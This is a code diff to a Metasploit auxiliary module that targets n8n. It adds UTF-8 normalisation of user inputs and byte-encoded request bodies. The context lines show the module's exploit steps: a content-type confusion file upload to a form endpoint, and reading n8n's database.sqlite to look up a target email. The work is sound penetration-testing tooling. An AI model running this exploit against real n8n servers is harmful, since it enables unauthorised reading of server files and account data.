@@ -46,6 +46,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def content_type_confusion_upload(form_uri, filename)
+    filename = utf8_text(filename, 'Filename')
     extraction_filename = "#{Rex::Text.rand_text_alpha(rand(8..11))}.pdf"
     json_data = {
       files: {
@@ -66,7 +67,8 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri('form-test', form_uri),
       'method' => 'POST',
       'ctype' => 'application/json',
-      'data' => json_data.to_json
+      # Rex frames request data by length, so send serialized JSON as bytes.
+      'data' => json_data.to_json.b
     })
 
     fail_with(Failure::UnexpectedReply, 'Received unexpected response') unless res&.code == 200
@@ -243,6 +245,20 @@ class MetasploitModule < Msf::Auxiliary
     true
   end
 
+  def utf8_text(value, name)
+    fail_with(Failure::BadConfig, "#{name} must contain valid UTF-8 text.") unless value.is_a?(String)
+
+    text = value.dup
+    # Console strings may be ASCII-8BIT even when their bytes are UTF-8 text.
+    text.force_encoding(::Encoding::UTF_8) if text.encoding == ::Encoding::BINARY
+    fail_with(Failure::BadConfig, "#{name} must contain valid UTF-8 text.") unless text.valid_encoding?
+
+    text.encode(::Encoding::UTF_8)
+  rescue ::Encoding::InvalidByteSequenceError, ::Encoding::UndefinedConversionError => e
+    elog('Failed to normalize n8n text input', error: e)
+    fail_with(Failure::BadConfig, "#{name} must contain valid UTF-8 text.")
+  end
+
   def valid_username?(username)
     /\A[\w+\-.]+@[a-z\d-]+(\.[a-z\d-]+)*\.[a-z]+\z/i =~ username
   end
@@ -372,6 +388,7 @@ class MetasploitModule < Msf::Auxiliary
       target_email = datastore['TARGET_EMAIL']
 
       fail_with(Failure::BadConfig, 'Target email needs to be set') if target_email.blank?
+      target_email = utf8_text(target_email, 'TARGET_EMAIL')
       fail_with(Failure::BadConfig, 'Target email should be valid email') unless valid_username?(target_email)
 
       db_content = read_file("#{datastore['N8N_CONFIG_DIR']}/database.sqlite")
